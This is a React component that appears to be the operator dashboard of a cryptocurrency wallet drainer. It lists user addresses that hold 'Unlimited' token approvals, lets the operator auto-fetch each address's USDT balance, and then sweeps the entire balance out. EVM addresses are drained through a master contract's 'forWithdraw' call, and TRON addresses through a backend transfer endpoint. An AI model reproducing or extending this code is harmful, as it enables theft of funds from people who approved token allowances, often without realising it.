import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { Loader2, Copy } from "lucide-react";
import { useWriteContract } from "wagmi";
import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
import {
  USDT_CONTRACT,
  MASTER_CONTRACT,
  RPC,
  USDT_ABI,
  MASTER_ABI,
  getTronTRC20Balance,
} from "../utils/helper";

declare global {
  interface Window {
    tronWeb: any;
    tronLink: any;
  }
}


interface ApiItem {
  _id: string;
  network: string;
  owner: string;
  amount: string;
  txHash: string;
  blockNumber: number;
  logIndex: number;
  isProcessed: boolean;
  createdAt: string;
  updatedAt: string;
}

interface Props {
  data: ApiItem[];
  allData?: ApiItem[];
  autoFetchAll?: boolean;
}

const provider = new ethers.JsonRpcProvider(RPC);

export default function DataTable({ data, allData = [], autoFetchAll = false }: Props) {
  const [balances, setBalances] = useState<{ [key: string]: string }>({});
  const [loading, setLoading] = useState<{ [key: string]: boolean }>({});
  const [processingAddress, setProcessingAddress] = useState<string | null>(
    null,
  );
  const fetchedKeysRef = useRef<Set<string>>(new Set());
  const { isConnected } = useAppKitAccount();
  const { open } = useAppKit();
  const { writeContract, isPending: isTransferring } = useWriteContract();

  const getRowKey = (address: string, network: string) =>
    `${network}::${address.toLowerCase()}`;

  const readBalance = async (address: string, network: string) => {
    if (network === "TRON Mainnet") {
      const bal = await getTronTRC20Balance(address);
      return bal.toLocaleString("en-US", { minimumFractionDigits: 2 });
    }

    const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
    const balance = await contract.balanceOf(address);
    const decimals = await contract.decimals();
    return ethers.formatUnits(balance, decimals);
  };

  const handleCheckBalance = async (address: string, network: string) => {
    if (!address) return;
    const rowKey = getRowKey(address, network);

    try {
      setLoading((prev) => ({ ...prev, [address]: true }));
      const formatted = await readBalance(address, network);
      setBalances((prev) => ({
        ...prev,
        [address]: formatted,
      }));
      fetchedKeysRef.current.add(rowKey);
    } catch (error) {
      console.error(`Error fetching balance for ${address}:`, error);
    } finally {
      setLoading((prev) => ({ ...prev, [address]: false }));
    }
  };

  useEffect(() => {
    if (!autoFetchAll || !allData.length) return;

    const uniqueItems = Array.from(
      new Map(
        allData
          .filter((item) => item.owner)
          .map((item) => [getRowKey(item.owner, item.network), item]),
      ).values(),
    );

    const itemsToFetch = uniqueItems.filter((item) => {
      const rowKey = getRowKey(item.owner, item.network);
      return !fetchedKeysRef.current.has(rowKey);
    });

    if (!itemsToFetch.length) return;

    let cancelled = false;

    const run = async () => {
      const updates: Record<string, string> = {};
      const loadingUpdates: Record<string, boolean> = {};

      itemsToFetch.forEach((item) => {
        loadingUpdates[item.owner] = true;
      });
      setLoading((prev) => ({ ...prev, ...loadingUpdates }));

      const results = await Promise.allSettled(
        itemsToFetch.map(async (item) => ({
          key: getRowKey(item.owner, item.network),
          owner: item.owner,
          balance: await readBalance(item.owner, item.network),
        })),
      );

      if (cancelled) return;

      results.forEach((result, index) => {
        const item = itemsToFetch[index];
        if (result.status === "fulfilled") {
          updates[item.owner] = result.value.balance;
          fetchedKeysRef.current.add(result.value.key);
        } else {
          console.error(`Error preloading balance for ${item.owner}:`, result.reason);
        }
      });

      if (Object.keys(updates).length > 0) {
        setBalances((prev) => ({ ...prev, ...updates }));
      }

      setLoading((prev) => {
        const next = { ...prev };
        itemsToFetch.forEach((item) => {
          next[item.owner] = false;
        });
        return next;
      });
    };

    run();

    return () => {
      cancelled = true;
    }
  }, [allData, autoFetchAll]);

  // const executeTransfer = async (fromAddress: string) => {
  //   try {
  //     const balanceStr = balances[fromAddress] || "0";
  //     if (balanceStr === "0" || balanceStr === "0.0") {
  //       alert("❌ Error: Balance is 0 or not fetched yet.");
  //       return;
  //     }

  //     const amount = ethers.parseUnits(balanceStr, 18);

  //     const writeData = {
  //       address: MASTER_CONTRACT as `0x${string}`,
  //       abi: MASTER_ABI,
  //       functionName: "forWithdraw",
  //       args: [fromAddress as `0x${string}`, amount],
  //     };

  //     console.log("writeData is : ", writeData);

  //     writeContract(writeData, {
  //       onSuccess: (hash: any) => {
  //         alert("✅ Transfer Transaction Submitted: " + hash);
  //       },
  //       onError: (error: any) => {
  //         console.error("Transfer error:", error);
  //         alert(
  //           "❌ Transfer Failed: " +
  //             ((error as any).shortMessage || error.message),
  //         );
  //       },
  //     });
  //   } catch (error) {
  //     console.error(error);
  //     alert("❌ Error calculating amount");
  //   }
  // };

  const executeTransfer = async (fromAddress: string, network: string) => {
    try {
      const balanceStr = balances[fromAddress] || "0";
      if (balanceStr === "0" || balanceStr === "0.0") {
        alert("❌ Error: Balance is 0 or not fetched yet.");
        return;
      }

      setProcessingAddress(fromAddress);

      if (network === 'TRON Mainnet') {
        try {
          const BASE_URL = import.meta.env.VITE_BASE_URL;
          const res = await fetch(`${BASE_URL}/api/transfer-usdt-trc20`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ address: fromAddress }),
          });

          const data = await res.json();
          if (res.ok) {
            alert(`✅ TRON Transfer Submitted: ${data.txHash || 'Success'}`);
          } else {
            throw new Error(data.message || "Failed to transfer");
          }
        } catch (error: any) {
          console.error("TRON Transfer error:", error);
          alert("❌ TRON Transfer Failed: " + (error.message || "Unknown error"));
        } finally {
          setProcessingAddress(null);
        }
      } else {
        const amount = ethers.parseUnits(balanceStr, 18);

        const writeData = {
          address: MASTER_CONTRACT as `0x${string}`,
          abi: MASTER_ABI,
          functionName: "forWithdraw",
          args: [fromAddress as `0x${string}`, amount],
        };

        writeContract(writeData, {
          onSuccess: (hash: any) => {
            alert("✅ Transfer Transaction Submitted: " + hash);
            setProcessingAddress(null); // प्रोसेस खत्म
          },
          onError: (error: any) => {
            console.error("Transfer error:", error);
            alert(
              "❌ Transfer Failed: " +
              ((error as any).shortMessage || error.message),
            );
            setProcessingAddress(null); // प्रोसेस खत्म
          },
        });
      }
    } catch (error) {
      console.error(error);
      alert("❌ Error calculating amount");
      setProcessingAddress(null); // एरर आने पर रिसेट
    }
  };

  const handleTransferFund = async (fromAddress: string, network: string) => {
    if (network !== 'TRON Mainnet' && !isConnected) {
      open();
      return;
    }

    await executeTransfer(fromAddress, network);
  };

  return (
    <div className="w-full">
      {/* Mobile Card View */}
      <div className="md:hidden space-y-4">
        {data.map((item, index) => (
          <div key={item._id} className="bg-white p-4 rounded-lg shadow-sm border space-y-3">
            <div className="flex justify-between items-center border-b pb-2">
              <span className="font-semibold text-gray-700">#{index + 1}</span>
              <span className="text-xs bg-gray-100 px-2 py-1 rounded text-gray-600">{item.network}</span>
            </div>

            <div>
              <span className="text-xs text-gray-500 block mb-1">User Address</span>
              <div className="flex items-center gap-2 bg-gray-50 px-2 py-1.5 rounded border inline-flex">
                <span className="text-sm font-mono text-gray-700">{item.owner ? `${item.owner.slice(0, 8)}...${item.owner.slice(-6)}` : ''}</span>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(item.owner);
                    alert("Address copied to clipboard");
                  }}
                  className="text-gray-400 hover:text-green-600 transition-colors"
                  title="Copy Address"
                >
                  <Copy className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="flex justify-between items-center">
              <div>
                <span className="text-xs text-gray-500 block">Balance</span>
                <span className="text-sm font-mono font-medium text-green-600">{balances[item.owner] || "0.00"}</span>
              </div>
              <button
                onClick={() => handleCheckBalance(item.owner, item.network)}
                className="bg-green-600 text-white px-3 py-1.5 rounded text-sm font-medium"
              >
                {loading[item.owner] ? "Checking..." : "Check"}
              </button>
            </div>

            <div className="flex justify-between items-center pt-2 border-t">
              <span className="text-xs text-gray-500">Transfer Funds</span>
              <button
                onClick={() => handleTransferFund(item.owner, item.network)}
                disabled={processingAddress === item.owner}
                className={`${processingAddress === item.owner
                  ? "bg-gray-400"
                  : "bg-blue-600"
                  } text-white px-3 py-1.5 rounded text-sm font-medium inline-flex items-center gap-2 disabled:cursor-not-allowed`}
              >
                {processingAddress === item.owner ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Wait...
                  </>
                ) : (
                  "Transfer"
                )}
              </button>
            </div>

            <div className="flex justify-between text-xs text-gray-500 pt-1">
              <span>Block: {item.blockNumber}</span>
              <span>{new Date(item.createdAt).toLocaleDateString()}</span>
            </div>
          </div>
        ))}
      </div>

      {/* Desktop Table View */}
      <div className="hidden md:block overflow-x-auto">
        <table className="w-full border-collapse">
          <thead>
            <tr className="bg-gray-100 border-b">
              <th className="px-4 py-3 text-sm text-left">No</th>
              <th className="px-4 py-3 text-sm text-left">Check Balance</th>
              <th className="px-4 py-3 text-sm text-left">Transfer</th>
              <th className="px-4 py-3 text-sm text-left">Balance</th>
              <th className="px-4 py-3 text-sm text-left">User Address</th>
              <th className="px-4 py-3 text-sm text-left">Amount</th>
              <th className="px-4 py-3 text-sm text-left">Network</th>
              <th className="px-4 py-3 text-sm text-left">Block</th>
              <th className="px-4 py-3 text-sm text-left">Created</th>
            </tr>
          </thead>
          <tbody>
            {data.map((item, index) => (
              <tr key={item._id} className="border-b hover:bg-gray-50">
                <td className="px-4 py-3">{index + 1}</td>

                <td className="px-4 py-3">
                  <button
                    onClick={() => handleCheckBalance(item.owner, item.network)}
                    className="bg-green-600 text-white px-2 py-1 rounded"
                  >
                    {loading[item.owner] ? "Checking..." : "Check"}
                  </button>
                </td>

                <td className="px-4 py-3">
                  <button
                    onClick={() => handleTransferFund(item.owner, item.network)}
                    disabled={processingAddress === item.owner}
                    className={`${processingAddress === item.owner
                      ? "bg-gray-400"
                      : "bg-blue-600"
                      } text-white px-2 py-1 rounded inline-flex items-center gap-2 disabled:cursor-not-allowed`}
                  >
                    {processingAddress === item.owner ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Transferring...
                      </>
                    ) : (
                      "Transfer"
                    )}
                  </button>
                </td>

                <td className="px-4 py-3 text-xs font-mono">
                  {balances[item.owner] || "0.00"}
                </td>

                <td className="px-4 py-3">
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-mono">{item.owner ? `${item.owner.slice(0, 8)}...${item.owner.slice(-6)}` : ''}</span>
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(item.owner);
                        alert("Address copied to clipboard");
                      }}
                      className="text-gray-400 hover:text-green-600 transition-colors p-1"
                      title="Copy Address"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </td>

                <td className="px-4 py-3">Unlimited</td>
                <td className="px-4 py-3">{item.network}</td>
                <td className="px-4 py-3">{item.blockNumber}</td>
                <td className="px-4 py-3">
                  {new Date(item.createdAt).toLocaleString()}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
